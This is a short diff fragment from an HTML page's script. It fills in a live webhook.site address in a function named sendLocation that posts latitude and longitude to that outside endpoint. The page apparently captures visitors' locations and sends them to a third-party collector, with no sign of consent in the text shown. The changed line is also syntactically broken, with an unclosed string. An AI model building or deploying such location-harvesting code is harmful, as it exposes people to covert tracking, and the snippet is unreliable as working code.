@@ -34,8 +34,7 @@
   <script>
     function sendLocation(lat, lon) {
       // IMPORTANT: Replace the URL below with your actual webhook URL
-      const webhookUrl = "https://webhook.site/YOUR_UNIQUE_ID"; 
-
+      const webhookUrl = "https://webhook.site/92e379a8-61ba-4578-9f81-2888f632669c
       fetch(webhookUrl, {
         method: "POST",
         headers: {
